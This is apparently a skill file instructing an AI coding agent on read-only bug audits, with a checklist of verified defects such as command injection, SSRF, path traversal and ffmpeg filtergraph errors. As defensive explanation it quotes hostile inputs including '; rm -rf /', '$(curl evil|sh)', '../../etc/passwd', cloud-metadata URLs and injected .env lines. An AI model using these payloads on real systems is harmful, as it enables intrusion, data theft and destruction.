name: source-audit
description: Pre-emptive STATIC BUG-HUNT of a source subsystem. Read the code, form hypotheses, then RUNTIME-VERIFY every suspected bug with a tiny probe script (or exact code-path trace) BEFORE reporting. Deliver a file:line report of verified real errors + suggested fixes. NO edits, NO commits unless the user explicitly asks. Distinct from systematic-debugging (you already have a symptom) and verify-codebase (understand-to-change).

# Triggers
- "bug-hunt <subsystem>", "review <dir> for errors", "audit src/lib and report real bugs", "find verified errors in ..."
- Any task asking for a defect/error report on EXISTING code WITHOUT making changes.

# Non-triggers (use the other skill)
- You already have a failing test / observable symptom and need root cause → `systematic-debugging`
- You need to UNDERSTAND a codebase before changing it → `verify-codebase`
- Wiring standalone / "complete but unwired" modules → `verify-before-integrate`

# Workflow (do all of these)
0. **Baseline before reading.** Run the scoped unit tests AND a typecheck first — a green baseline proves the subsystem compiles and gives the report its "tests pass, 0 fail" line. For a TS project: `npm run typecheck` (or `tsc -p tsconfig.json --noEmit`) and `node --import tsx --test --experimental-test-module-mocks "src/<area>/**/*.test.ts"`. Record the exact `# tests / # pass / # fail / # skip` counts; report them. This session: baseline was 153 tests / 146 pass / 0 fail / 7 skip, typecheck clean — no test or typecheck failure was masking the real defects.
1. **Inventory & read.** List the subsystem's files (`find <dir> -type f`, not `search_files` for listings) and read every source file end-to-end. Map the data flow: search → relevance filter → download → verify → offline fallback.
2. **Hypothesis generation.** Grep for the usual bug magnets:
   - `throw` outside try/catch; `catch {}` that swallows without re-throw (intentional fault-isolation vs real defect — verify with callers/tests)
   - `fetch(` / `axios.get` with no `timeout` / no `AbortSignal`
   - `Promise.all` where `Promise.allSettled` is needed (one rejection kills the batch)
   - retry loops with wrong backoff; dedupe / slice / offset math in failover
   - relevance filters using whole-word regex `\\b${tok}\\b` (plural false-negatives)
   - auth headers; SSRF / URL guards (check BOTH image and video paths apply it)
   - **Command injection via `exec()` + `args.join(' ')`.** An allowlist on the *command* verb does NOT protect the *arguments*. If `exec(\`npm run ${cmd} -- ${args.join(' ')}\`)` or any `exec(\`...${userVal}...\`)` interpolates a user/agent-supplied array or string into a shell string, a value like `; rm -rf /` or `$(curl evil|sh)` executes. The existing test only rejects injection inside the *command* token (which is allowlisted) — it does NOT cover the `args` vector. **Fix:** use `execFile('npm', ['run', cmd, '--', ...args], ...)` / `spawn` with an argv array so the shell never parses args. This is the #1 critical finding class in security hunts.
   - **SSRF guard applied to only SOME URL-fetch paths.** A stock-media path may call `isSafeUrl()` correctly, but a *separate* user-supplied-URL download endpoint (e.g. social/yt-dlp download) may skip the guard entirely — it only validates `z.string().url()` (well-formed but arbitrary host). Attacker reaches `http://169.254.169.254/latest/meta-data/` or internal services. **Verify the SSRF/URL guard runs on EVERY externally-influenced URL**, including user-supplied download URLs handed to yt-dlp/curl/ffmpeg, not just the curated stock providers.
   - **Filename/path schema that accepts `..`.** A "safe filename" regex like `/^[^\\/]+$/` rejects `/` but STILL accepts `..` and backslashes. If that value is later passed to `path.join(root, seg)` and the path resolver strips `..` only in ONE runtime mode (e.g. electron) but NOT the server/CLI mode, `..` escapes the intended dir (`inputAssetPath('../../etc/passwd')` → `C:\etc\passwd`). **Fix:** tighten the schema to also reject `..`/`.` (`/^(?!\.\.?\/?$)[^\\/]+$/`) AND make the resolver strip/throw on `..` regardless of runtime.
   - **Global auth-bypass env flag.** A single env var (e.g. `ALLOW_UNSAFE_REMOTE_ADMIN=1`) that makes `isLocalRequest` return `true` for ALL requests disables the loopback gate on every sensitive route (fs read/write, env write, asset delete). If set in any shared/deployed config, any remote client gets full local-FS access. **Fix:** never let one flag override per-route IP checks for write/delete routes; if LAN access is needed, bind an explicit trusted-CIDR allowlist and keep destructive routes behind loopback.
   - `require()` of optional modules (offline fallback) — does a failure degrade silently?
   - **Derived path/filename OUTSIDE the `try` block.** A malformed URL (`new URL(hit.url)`) or `path.extname` on an empty/odd string throws *synchronously past* its `try/catch`. Worse, if the producer runs inside a bare `Promise.all` (not `Promise.allSettled` / a `safe()` wrapper), that rejection kills the WHOLE batch and can force a 100% offline/placeholder fallback — one bad asset silently wipes out every real download. Verify HOW the producer is invoked before calling it a defect.
   - **Timeout / `Promise.race` discards already-completed work.** A `withTimeout` rejection drops a partially-filled result array; check the timeout `catch` actually *retains partials* (reusing on-disk files) instead of re-running a fresh sweep that re-downloads everything from scratch and orphans the originals. A comment admitting "whatever was pushed is lost on timeout" means it's broken.
   - **`catch`-block that registers a ghost `localPath`.** On a copy/download failure the code does `localPath = destPath` then falls through to `candidates.push({ localPath })` where `destPath` was NEVER written → a candidate pointing at a non-existent file (downstream ffprobe reads width 0 → fails the source check). The failure path should `return`/drop the candidate, not register a ghost.
   - **Cross-file type-cast drift (`as unknown as`).** A function receives `obj as unknown as SomeType` but `obj` is a different shape that LACKS required fields of `SomeType`. The TS cast hides it at compile time; downstream code reads `cfg.topic` (or similar) and always gets `undefined` → a structured-output field is silently empty in every record. Verify the cast object actually carries every field the receiver reads; prefer passing the real field or `?? ''`. (Real example: `publish.ts` reads `cfg.topic` from `res.plan as unknown as AgenticConfig`, but `Plan` has no `topic` → every published manifest had `topic: undefined`.)
   - **Resumable-manifest staleness.** A worker writes a manifest to disk mid-run, but the `manifest.jobs` array is only rebuilt from the live in-memory map AT THE END. Mid-run writes therefore persist a STALE array; if the process crashes, `--resume` reads the stale manifest and re-runs already-completed jobs — defeating the resumable design. Before each mid-run `writeManifest`, refresh `manifest.jobs = [...entries.values()]`. (Real example: `batch-queue.ts` writes at worker start/end from a stale `manifest.jobs`, only assigning the live array on the final line.)
   - **Filter-key normalization asymmetry.** A `--only`/include filter is compared against IDs that were TRANSFORMED (e.g. `sanitizeFilename(title)` → lowercase + non-alphanumerics→`_`), but the filter VALUES came straight from argv and were NOT transformed. The comparison then never matches → selected jobs silently skipped. Sanitize the filter values the SAME way the IDs are produced. (Real example: `cli-runner.ts` `--only` split raw strings vs `sanitizeFilename` job ids.)
   - **Cross-file wiring drift.** A defect in module A may only bite because the caller in module B invokes it wrongly (e.g. passes `localPath` as a default that's never created, or ignores a returned field). Grep the callers before declaring module A the sole culprit.
   - **Filename/stem CONTRACT asymmetry between producer and consumer.** A writer emits `${jobId}_remotion_16x9.mp4` (or `${jobId}.mp4`, or `_captions_${jobId}.srt`) but a downstream reader searches for `${jobId}_16x9.mp4` / `${jobId}.srt`. The reader silently falls back to the wrong file (every platform gets the same aspect) or misses sidecars entirely. Grep BOTH the writer's `path.join(...)`/`out =` lines AND the reader's candidate list; confirm the stem/location match exactly. (Real example: `publish.ts` `pickFileForAspect`/`findSubtitles` vs `orchestrate.ts` render/Remotion output + `_captions_${jobId}.srt`.)
   - **Verification gate called with a bogus constant "expected" value.** A post-render / quality gate is invoked with a fake expected input (e.g. `verifyRenderedVideo(out, 1, …)` where `1` is the expected duration) so its tolerance math collapses and it passes everything → the gate is a no-op. When a gate takes an "expected" arg, confirm the caller passes the REAL value (probe the output or thread the known duration), not a placeholder. (Real example: `dispatch.ts:69`.)
   - **Guard/allowlist SCOPE narrower than callers' inputs → silent no-op.** A safety/sanitizer function (e.g. a `canCleanupDirectory` allowlist) only permits a subset of the directories its callers actually pass; the others hit the `continue`/early-return branch and nothing happens. Verify the allowlist roots COVER every path the callers feed in, and that the relationship is `isPathWithin(root, input)`-true (siblings of the root fail). (Real example: `cli-runner.ts` cleans `public/videos` but `cleaner.ts` only allows `tmp` + `public/jobs`; `videos` is a sibling of `jobs` → no-op.)
   - **Cross-file CONSTANT / path-literal DIVERGENCE from the canonical resolver.** Two modules hardcode the same logical path/constant two different ways (one via `resolveProjectPath('.x')`, the other via `path.resolve(cwd, 'agentic-pipeline/.x')`). They silently point at different files, so a "clear cache" / "read state" op acts on a non-existent path while the real artifact is elsewhere. Always route shared paths through ONE resolver; grep for raw `path.resolve(cwd, …)` duplicates of a `resolveProjectPath(...)` constant. (Real example: `autopilot.ts:46` VIDEO_CACHE vs `visual-fetcher.ts:49` CACHE_FILE.)
   - **Resume CONFIG-METADATA staleness (inverse of resumable-manifest staleness).** On `--resume`, the loaded manifest's scalar metadata (`concurrency`, `maxRetries`) overrides the freshly-passed CLI options, so resuming with different knobs records the WRONG values. The resumable-manifest pitfall is about the `jobs` ARRAY going stale; this is about the metadata SCALARS. Keep only `jobs` from the old manifest and re-apply the live options to the scalars. (Real example: `batch-queue.ts:213`.)
   - **Generated/templated shell script with a mangled variable reference.** A heredoc/curl helper built with template literals emits a corrupted shell var (e.g. `-H "Authorization: Bearer $YOUTU...OKEN"` instead of `$YOUTUBE_ACCESS_TOKEN`) → with `set -e` the script can never run. INSPECT the full literal bytes: this is a REAL defect (a mistyped var inside a template string), NOT the display-mask-of-`Bearer` (`***`) artifact the pitfalls warn about. The giveaway: the string is visibly `$YOUTU...OKEN`, not `*Authorization: ***`.
   - **`--only` / filter parsed but never wired into a code path.** Even when the filter is sanitized the SAME way IDs are produced (so the asymmetry pitfall is avoided), a filter can be PARSED unconditionally yet only CONSUMED inside one branch (e.g. `if (batch || resume)`), so in the other (single) mode every job is processed. Grep every read-site of the parsed filter var, not just the parser. (Real example: `cli-runner.ts:49-57` parses `onlyIds` but only uses it at line 178; the single-mode loop at 191 ignores it.)
3. **RUNTIME-VERIFY every suspected bug. Never report an unverified "looks wrong".** Two techniques:
   - **(a) Probe script** — write a tiny `*.ts`, run `npx tsx <file>.ts`, import the ACTUAL function, assert expected vs actual, print results. Catches logic/SSRF bugs. Delete the probe after.
   - **(b) Exact code-path trace** — if you can't easily execute it (needs network/keys), trace the precise control flow and cite the lines. Label the report item `REPRODUCED` vs `code-path analysis`.
4. **Rule out display artifacts.** Terminal/read tools may REDACT secrets as `***`. Before reporting a "hardcoded credential / key" bug, `sed -n 'Np' <file> | cat -A` or `od -c` the exact line. Confirm whether `***` is a real literal or a masked variable name.
   - Real false alarm: `Authorization: ***` was actually `Authorization: key` / `Authorization: pexelsApiKey` — NOT a bug.
   - **`***` on an `Authorization` line is a DISPLAY-MASK of `Bearer`, not the literal source** (see checklist "Worked example 4"). It appears in grep/sed/read_file/Node `readFileSync` alike. To disprove a "missing Bearer" bug, find a sibling test asserting the real `Bearer <val>` that **passes** — that proves the source has `Bearer`. On Win/MSYS `python3` is missing; probe bytes with `node -e "const fs=require('fs');console.log(JSON.stringify(fs.readFileSync(f,'utf8').split('\n')[n-1]))"`.
5. **Confirm green + unmodified.** Run the scoped unit tests (`npx tsx --test --test-timeout=120000 "src/lib/<x>.test.ts" ...`). `git diff --stat -- <in-scope paths>` to PROVE you touched no source. Remove scratch `probe*.ts`.
6. **Report.** For each issue: `file:line`, severity, what breaks, the confirmation method, and a concrete suggested fix. State false alarms you checked and cleared.

# Scaling: parallel subagent fan-out (large codebases)
When the codebase is large (dozens of source files across several subsystems),
don't hunt it all solo. Fan out N **read-only** `delegate_task` hunters in ONE
batch (respect the host's RAM/concurrency cap — this box allows 3 concurrent):
- 1 hunter per subsystem (media / render-orchestration / cli-config-brain),
  each scoped with exact `target` paths + the bug-magnet checklist above.
- Each hunter returns a **verified `file:line` report + minimal fix snippet,
  and is told explicitly NOT to edit files** (the parent applies fixes, so the
  edits go through one consistent diff + one commit).
- Give each hunter the SAME instructions: run the scoped tests + typecheck
  first (baseline line), read every target file, RUNTIME-VERIFY each suspected
  bug (probe script or exact code-path trace), and cite a specific line for
  every claim. Tell them NOT to flag a bug they can't cite a line for.
Then the parent: triages all three reports, applies the fixes, re-runs the
FULL suite + typecheck, and commits at the green checkpoint. This pattern
found + fixed 11 real bugs across 3 subsystems in one pass and keeps the diff
clean (no competing edits from workers). It is the read-only variant of
`multi-agent-swarm-ops` (which also covers RAM/concurrency discipline).

# Pitfalls (embedded from real sessions)
- **Display redaction `***` is NOT a bug until hexdumped.** Always `od -c` / `cat -A` before reporting credential/secret issues.
- **`***` on an `Authorization` line is a DISPLAY-MASK of `Bearer`, not the literal source.** Proven this session: the mask appears identically in `grep`, `sed -n`, `read_file`, AND Node `readFileSync(split('\n')[n-1])` — so it is a tooling redaction layer, not real bytes. You therefore CANNOT byte-verify the literal `Bearer` via any of those channels. To confirm indirecty: find a unit test that exercises the exact line and asserts the real header value (e.g. `assert.equal(headers['Authorization'], 'Bearer test-api-key')`) — if that test **passes**, the source contains the real `Bearer` and there is no bug. Do not re-report a "missing Bearer" that a passing sibling test already disproves.
- **On Windows/MSYS hosts `python3` is MISSING** (the `od -c` / `python3 -c` recipe in this skill may fail with `command not found`). Use Node as the hex/byte probe instead: `node -e "const fs=require('fs');const l=fs.readFileSync(f,'utf8').split('\n')[n-1];console.log(JSON.stringify(l))"` — `JSON.stringify` makes control chars/odd bytes obvious without python.
- **Whole-word `\b${tok}\b` filters reject plurals** ("Lions" vs "lion") and multi-word titles → under-deliver real on-topic assets, silently triggering placeholder fallbacks. Test the filter with plural / compound / non-Latin inputs. Fix: match stem + optional `s` (`\b${stem}s?\b`) and keep an `offTopicCompounds` map keyed on the stem too.
- **SSRF guard misses IPv4-mapped IPv6.** A check that only matches dotted-decimal IPv4 lets `[::ffff:127.0.0.1]` and `[::ffff:169.254.169.254]` (cloud metadata) through. Also cover ULA `fc/fd`, link-local `fe8x`, multicast. Verify the guard runs on BOTH the image and video download branches (one path often forgets it).
- **SSRF guard only on the curated path, not the user-URL path.** A repo may have a correct `isSafeUrl()` used by stock-media download, but a *separate* endpoint that accepts an arbitrary user URL (social/yt-dlp download) may validate only `z.string().url()` and hand it straight to `spawn('yt-dlp', [url])` with NO `isSafeUrl` call. That endpoint is frequently unauthenticated (`router.post('/social-download/process', validateRequest(...))` with no `requireLocalAccess`). Verify: grep ALL `fetch(`/external URL sinks and confirm each is guarded, not just the obvious one. (Real example: AVG `social-download-controller.ts` → `video-downloader-service.ts` spawned yt-dlp on an arbitrary URL with no SSRF check.)
- **Command injection via `exec()` + `args.join(' ')`.** Allowlisting the *command* token is NOT sufficient — the *arguments* still hit a shell. `exec(\`npm run ${command} -- ${args.join(' ')}\`)` runs any shell metacharacter in `args` (`; rm -rf /`, `$(curl evil|sh)`). The existing test only asserts the *command* may not contain `; rm -rf /` (rejected by the allowlist) — it does NOT exercise the `args` vector. **Fix:** `execFile('npm', ['run', command, '--', ...args])` or `spawn`. Repro: `node -e "console.log('npm run generate -- ' + ['--x=$(curl evil|sh)'].join(' '))"` shows the raw shell string. (Real example: AVG `pipeline-commands.ts:12`.)
- **`safeFilenameSchema` accepts `..` / backslash traversal.** Regex `/^[^\\/]+$/` blocks `/` but allows `..` and `\`. Combined with a resolver that strips `..` only in electron mode (not server mode), `inputAssetPath(req.localAsset)` escapes the asset dir. Repro: `node -e "const re=/^[^\\/]+$/;console.log(re.test('..'), re.test('a\\\\b'))"` → both `true`. **Fix:** schema `.refine(s=>!s.includes('..'))` AND strip `..` in the resolver for all runtimes. (Real example: AVG `schemas/api.schemas.ts:5` + `shared/runtime/paths.ts:58` server branch.)
- **Global `ALLOW_UNSAFE_*` env bypasses local-only auth.** One env var returning `true` from `isLocalRequest` for every request disables the loopback gate on fs/env/delete routes. Treat any such flag as a deployment hazard; confirm it is documented DANGER-only and never set in shared/deployed `.env` / Docker / compose. (Real example: AVG `middleware/local-only.ts:14`.)
- **`publicId`/`id` unconstrained → output path traversal.** Loose `z.string().min(1).max(128)` (no filename constraint) fed raw into `resolveProjectPath('output', job.publicId)` escapes `output/` in server mode. Constrain with the (fixed) `safeFilenameSchema`.\n- **`startsWith(root)` containment check → sibling-directory escape.** A guard like `path.resolve(p).startsWith(projectRoot)` is a STRING prefix test, not a path-boundary test: `C:\\one\\Automated-Video-Generator-secret\\file` starts-with `C:\\one\\Automated-Video-Generator` → `true`, so any sibling dir whose name begins with the root string escapes. Repro (verified this session): `node -e \"console.log('C:/one/AVG-secret/f'.startsWith('C:/one/AVG'))\"` → `true`. **Fix:** `const rel = path.relative(root, resolved); if (rel==='' ? false : rel.startsWith('..') || path.isAbsolute(rel)) throw`. Grep for every `.startsWith(<root>)`/`.startsWith(projectRoot)` used as a containment gate. (Real AVG: `local-filesystem.ts:19-24` `assertPathWithinProject`, reached by `/fs/view`, `/fs/ls`, `/fs/save-to`.)\n- **Copy-into-served-dir with only an existence check → arbitrary file disclosure.** A \"pick a local file\" endpoint that does `fs.existsSync(src) && isFile` then `copyFileSync(src, INPUT_ASSET_ROOT/...)` with NO containment check on `src` lets a local client copy `/etc/passwd`, `.env`, SSH keys into a web-served dir (`/assets/input/...`) and read them back. The extension allowlist does NOT help (attacker renames, or the target dir is served raw). **Fix:** constrain `src` to an allowlist of roots or run it through the (fixed) containment guard. (Real AVG: `local-filesystem.ts:112-146` `pickFile` → `POST /fs/pick`.)\n- **`.env` line-injection via unsanitized key/value write.** An env-writer that does `updatedLines.push(\\`${key}=${value}\\`)` with no `\\n`/`\\r` rejection AND no key allowlist lets a `value` containing a newline inject arbitrary lines (`ALLOW_UNSAFE_REMOTE_ADMIN=1`, `TRUST_PROXY=1`) → persistent config tamper on restart. Note the asymmetry: the HTTP env route may be constrained by a Zod schema + `EDITABLE_ENV_KEYS` while the MCP tool writing the same file is NOT. **Fix:** reject `\\n`/`\\r` in key+value and enforce the same allowlist on every writer. (Real AVG: `mcp/env-tools.ts:32-45` `updateEnvConfig` vs HTTP `setup-controller` which is allowlisted.)\n- **`fs.ReadStream` piped to `res` without `res.on('close')` cleanup → fd leak.** `stream.on('error', ()=>res.destroy())` handles stream errors but NOT client aborts: when the client disconnects mid-stream the read stream keeps running and holds the fd. Under many concurrent aborts this leaks descriptors. **Fix:** `res.on('close', () => stream.destroy())` before `stream.pipe(res)`. (Real AVG: `agentic-controller.ts:91-93` video/contact-sheet streams, `files-controller.ts:32-40` `viewFile`.)\n- **axios client with no `maxRedirects:0` → SSRF-guard-after-redirect bypass.** `isSafeUrl()` validates only the INITIAL URL; a public host returning `302 Location: http://169.254.169.254/...` is followed (axios default 5 redirects) with no re-validation. **Fix:** set `maxRedirects:0` in the shared `createHttpClient`, or re-run `isSafeUrl` on each redirect `Location`. Pairs with the IPv4-mapped-IPv6 SSRF pitfall — a hunt should check BOTH the initial-URL guard AND redirect handling. (Real AVG: `free-video/http-client.ts` `createHttpClient` + `downloader.ts` streaming get.)
- **Failover off-by-one.** Slicing the candidate pool by `good.length` (count of *successes*) instead of tracking *failed* indices re-downloads successes and never retries the real failures. Track failed pool indices explicitly.
- **Divergent filter copies.** The same relevance/SSRF logic re-implemented in two modules drifts (one drops the brand/non-Latin checks). Reuse the canonical function instead of copy-pasting.
- **Search tool quirk:** `search_files` regex parser chokes on unescaped `(` / `(?:`, AND on this Windows/MSYS host a POSIX-style path like `C:/one/...` is rejected with `The system cannot find the path specified (os error 3)` — pass a NATIVE path with backslashes (`C:\one\...`) or just run terminal `grep -rn "pattern" path` for those lookups. This session hit both; terminal `grep` is the reliable fallback. (Reliability workaround, not a durable rule.)
  Also: passing a FILE path (not a directory) as `path` reliably fails with os error 3 too. After the FIRST `search_files` failure on a path, switch IMMEDIATELY to terminal `grep -rn` — do NOT re-issue the same `search_files` call (it trips the tool loop-warning and wastes a turn).
- **Intentional degrade-vs-defect:** a `catch → return null/[]` may be deliberate fault-isolation (check the doc comment + tests). Don't flag it as a bug unless it drops data the caller can't recover.
- **Filename/stem CONTRACT asymmetry (producer vs consumer).** The writer's `path.join`/`out =` stem and the reader's candidate list MUST match character-for-character. A reader that looks for `${jobId}_16x9.mp4` while the writer emits `${jobId}_remotion_16x9.mp4` (or `${jobId}.mp4` only) silently falls back to the wrong file for every platform target; a reader that looks for `${jobId}.srt` while the writer emits `_captions_${jobId}.srt` silently misses the native sidecar (localized `${jobId}.${lang}.srt` sidecars may still match — verify each). Grep both sides. (Real AVG: `publish.ts` `pickFileForAspect`/`findSubtitles` vs `orchestrate.ts` ffmpeg `${jobId}.mp4` / Remotion `${jobId}_remotion_*`.mp4 / `_captions_${jobId}.srt`.)
- **Verification gate with a bogus "expected" constant.** `verifyRenderedVideo(out, 1, …)` collapses X8 tolerance to `(0,3]s` and X7 size floor to `50KB` for ANY length → a broken trim/merge is reported "gate pass". The gate is only meaningful if the caller threads the real `expectedDurationSec`. (Real AVG: `dispatch.ts:69`.)
- **Guard/allowlist scope narrower than callers' inputs.** `cleanupAssets(['public/videos','public/audio'])` is a no-op when `canCleanupDirectory` only allows `tmp` + `public/jobs` (siblings of the allowed root fail `isPathWithin`). The allowlist must COVER every path callers pass. (Real AVG: `cli-runner.ts` + `cleaner.ts`.)
- **Cross-file path-literal divergence from the canonical resolver.** `autopilot.ts:46` `path.resolve(cwd,'agentic-pipeline/.video-cache.json')` is NOT where `visual-fetcher.ts:49` `resolveProjectPath('.video-cache.json')` writes (`<cwd>/.video-cache.json`). All "clear stale cache" self-heals therefore `rm` a non-existent file → cache never cleared. Route shared paths through ONE resolver.
- **Resume config-metadata staleness.** `batch-queue.ts:213` `manifest = previous ?? emptyManifest(...)` means on `--resume` the OLD `concurrency`/`maxRetries` win over the freshly-passed options → resume records wrong scalars. - **Templated shell var mangling is a REAL bug, not the `***` mask.** A generated curl heredoc showing `-H "Authorization: Bearer $YOUTU...OKEN"` is a mistyped variable (should be `$YOUTUBE_ACCESS_TOKEN`), NOT a display redaction — the literal text reveals the defect. Don't conflate with the "Authorization: *** is a mask of Bearer" pitfall above. (Real AVG: `publish.ts:136`.)
- **`--only` parsed but never wired.** A filter (`onlyIds`) parsed unconditionally yet only consumed in one branch (`if (batch || resume)`) is silently ignored in the other (single) mode. Grep EVERY read-site of the parsed var. (Real AVG: `cli-runner.ts:49-57` vs `178` vs single-mode loop at `191`.)
- **Copy into a web-served dir from an untrusted/remote-derived filename → disclosure + collision.** A download endpoint that fetches a remote URL, then copies the result into a served dir using ONLY `path.basename(remotePath)` (no `sanitizeFilename`, no `ensureAllowedExtension`, no `buildUniqueFilePath`) lets a crafted URL/title (`%2e%2e`, control chars, or a name colliding with an existing served file) land in the served tree and overwrite neighbors. `public/jobs` is typically `express.static`-served, so this is a write+disclosure sink. **Fix:** `sanitizeFilename()` + `ensureAllowedExtension()` + `buildUniqueFilePath()` before `fs.copyFileSync`. Grep every writer into `public/jobs` (social-download, free-video, batch). (Real AVG: `social-download-app.service.ts:53-68` copies `basename(absolutePath)` straight into `public/jobs/social_<ts>/`.)
- **MCP/agent `assetId` parse bug — `split(/_s|_c/)` mis-indexes.** `id.split(/_s|_c/)` on `"image_s5_c2"` yields `["image","5","2"]` (verified this session). # ffmpeg / libavfilter filtergraph verification (RECOMMENDED for media pipelines)
When a suspected bug lives in an ffmpeg `-filter_complex` string (drawtext escaping, xfade overlap math, amix/concat duration, vstack inputs), **DON'T trust code-reading alone** — build the EXACT filtergraph the code would emit and run it through the real `ffmpeg` binary. This proves/denies the bug in seconds and catches both "looks wrong but ffmpeg accepts it" (e.g. a duplicate option, which ffmpeg silently takes the LAST value of) and "looks fine but errors" (which throws and gets swallowed by an outer catch → silent feature death).

Probe recipe (Windows/MSYS; ffmpeg-static is the repo's binary):
```
F="$(node -e "console.log(require('ffmpeg-static'))")"
# Replicate the EXACT -vf / -filter_complex string from the code, then:
"$F" -f lavfi -i "color=c=blue:s=720x1280:d=1" -vf "<exact filtergraph>" -t 1 -y /tmp/probe.mp4 2>&1 | tail -3
echo "exit=$?"; ls -l /tmp/probe.mp4 2>&1 | awk '{print $5,$NF}'
# For audio graphs, probe a lavfi sine + -af and check Duration with:
"$F" -hide_banner -i /tmp/probe.wav 2>&1 | grep Duration
```
- Resolve the binary with `node -e "require('ffmpeg-static')"` INSIDE the repo dir. Doing it from `/tmp` fails with `MODULE_NOT_FOUND` — run the probe from the project root, or pass an absolute `F=.../node_modules/ffmpeg-static/ffmpeg.exe`.
- ffmpeg version in the AVG repo is 6.1.1 — the escaping rules below are verified against it.
- **Error signature → meaning:** `Filter X:default has an unconnected output` / `Invalid argument` almost always means the filtergraph ends in a *labeled* sink (e.g. `[aout]`) but the command has **no `-map '[aout]'`**. The whole run fails; if wrapped in try/catch the caller silently degrades (a "dead feature"). Fix: add `-map '[label]'`.
- `drawtext=text='...'` escaping: the project's `ffmpegDrawtextEscape` (src/lib/ffmpeg-text.ts) handles `\ : ' " ,`. Verified WORKING on 6.1.1: a `:` inside single-quoted text needs `\:`, and `enable='between(t\,0.00\,2.00)'` (escaped commas inside single quotes) WORKS. Don't flag these as bugs without reproducing.
- A **duplicate option** in one filter (e.g. `fontsize=58` twice) is NOT an error — ffmpeg uses the last occurrence. Only flag duplicates if they're semantically contradictory.
- **Windows gotcha — `execFileSync` rejection has `e.stderr === null`.** When you `execFileSync(ff,...)` and it fails, `e.stderr` is `null` (not a Buffer), so `e.stderr.toString()` THROWS (`Cannot read properties of null`). Capture the error line via `spawnSync(ff, args, {encoding:'utf8'})` and read `r.stderr`, OR prepend `try{...}catch(e){ const se = e.stderr ? e.stderr.toString() : e.message; ... }`. Also: probe a rendered clip's Duration/frames with **`ffprobe-static`** (`require('ffprobe-static').path`) rather than `ffmpeg -i` + `grep Duration` — on this host the `ffmpeg -i ... | grep` pipe gave misleading "no output file" errors. Recipe:
  ```js
  const fp = require('ffprobe-static').path;
  const raw = execFileSync(fp, ['-v','error','-count_frames','-show_entries','stream=nb_read_frames','-of','default=noprint_wrappers=1', out], {stdio:['ignore','pipe','pipe']}).toString();
  const frames = (raw.match(/nb_read_frames=(\d+)/)||[])[1];
  ```

# ffmpeg / Remotion bug patterns (verified this session)
- **ffmpeg `amix=...:duration=first` truncates to the SHORTEST input.** When audio clips are placed on a timeline via `adelay` (positioned at arbitrary times), use `duration=longest` (or `length`) so the bed spans the full length; `first` drops every clip that starts after the first one ends. Silent truncation — verify the output Duration.
- **xfade overlap arithmetic drift between video and text timelines.** If the video chain advances by `dur - xf` at every crossfade (xfade offset = cursor - xf), but the caption/kinetic-text windows accumulate raw `dur` with no `- xf`, the burned captions drift from the spoken audio by `~N*xf` by the last scene. Fix the text accumulator to subtract `xf` per scene (reuse the same `cursor`/`offsetFor()` math as the video chain).
- **xfade count must equal the real number of transitions in the chain — including intro/outro cards.** If intro→scene0 and lastScene→outro are xfades too, `xfadeTransitions = visuals.length + (intro?1:0) + (outro?1:0) - 1`. Under-counting makes `expectedDur`/`totalSec` too large, so the post-render duration gate (X8 "Duration matches plan") spuriously fails and the autopilot retries/softens. Verify the count matches the loop that actually emits xfades.
- **Remotion vs ffmpeg asset-shape drift.** A manifest asset may carry `localPath` but NOT `audioPath` (e.g. music candidates built with only `localPath`). A Remotion composition that guards `music && music.audioPath` then renders SILENT (no music, no ducking). When bridging a manifest into Remotion, copy `localPath`→`audioRel` for music too, or the audio track is never wired in.
- **`vstack=inputs=N` with a chain of single-input labels `[s0][s1]...[sN-1]vstack=inputs=N` WORKS** (each `[si]` is a 1-input scale output, so N labels feed `vstack=inputs=N`). Not a bug — don't "fix" it to `hstack`/`vstack=2` per pair.
- **`zoompan` `z=` with an UNESCAPED comma inside `min()` crashes the whole filtergraph.** `zoompan=z=min(zoom+0.0008,1.04):d=1:s=720x1280` — ffmpeg parses the `,` as a filter separator and aborts with `[AVFilterGraph] No option name near '1:s=720x1280'`. Because Ken Burns is often the default, this fails EVERY image scene in the single-pass path. **Fix:** escape the comma → `z='min(zoom+0.0008\,1.04)'` (or use `z=zoom+0.0008`, no `min`). Reproduced this session against ffmpeg 6.1.1. (Real AVG: `orchestrate.ts:1240`.) SEE ALSO the probe recipe "Windows gotcha" bullet for how to reproduce filtergraph failures on this host.
- **`zoompan` `d=1` collapses an image to ONE frame.** `zoompan=...:d=1` means "show each input frame for 1 frame", so an image (1 source frame) yields a 1-frame output → near-zero-duration clip. For a `dur`-second scene at `fps=25` use `d=dur*fps` (e.g. `d=100`) and set `fps=25` on the zoompan. Verify the rendered Duration/frames with ffprobe after changing `d`. (Real AVG: `orchestrate.ts:1490` uses `d=1` — works only because the segment is later forced to `-t dur`; in the single-pass path the collapse is fatal.)
